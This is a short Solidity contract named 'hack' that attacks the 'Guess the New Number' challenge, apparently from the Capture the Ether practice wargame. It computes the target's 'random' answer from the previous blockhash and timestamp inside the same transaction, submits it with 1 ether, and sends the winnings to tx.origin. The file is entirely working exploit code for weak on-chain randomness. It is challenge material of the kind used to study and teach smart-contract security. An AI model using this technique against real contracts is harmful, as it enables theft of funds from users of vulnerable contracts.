// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
interface IGuessTheNewNumberChallenge{
  function isComplete() external view returns (bool);
  function guess(uint8 n) external payable ;
}
contract hack{
    IGuessTheNewNumberChallenge public obj;
    constructor(address contractAddress) {
        obj = IGuessTheNewNumberChallenge(contractAddress);
    }
    function attack() external payable{
         require(address(this).balance >= 1 ether, "not enough funds harsh ");
         uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         obj.guess{value: 1 ether}(answer);
         require(obj.isComplete(), "challenge not completed");
         tx.origin.transfer(address(this).balance); 

    }
     receive() external payable {}
    function checkIsComplete() public view returns(bool){
        return obj.isComplete();
    }
}
